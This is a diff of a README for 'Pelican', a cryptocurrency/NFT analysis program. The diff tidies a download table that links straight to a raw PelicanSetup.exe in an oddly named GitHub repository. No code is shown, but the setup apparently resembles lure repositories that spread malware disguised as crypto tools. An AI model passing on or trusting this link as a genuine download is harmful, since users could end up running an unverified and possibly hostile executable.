@@ -30,15 +30,11 @@ Most tasks for analyzing cryptocurrencies is implemented through Pelican.
 To use the program, download and install the desired version for your device.
 If the program is not installed try reinstalling the package Visual Studio 2013 (VC++ 12.0)
 
-| System       | Download |
-| --- | --- |
-| Windows 10 x64 / x86 | Download |
-| Ubuntu 20.04 LTs | SOON |
 
 Example   | Description |
 --------- | --------- |
 [Windows 10 x64/x86](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe) | [Download](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe)
-Ubuntu 20.04 LTS / Soon | Download1
+Ubuntu 20.04 LTS / Soon | Download
 
 # Licensing
 
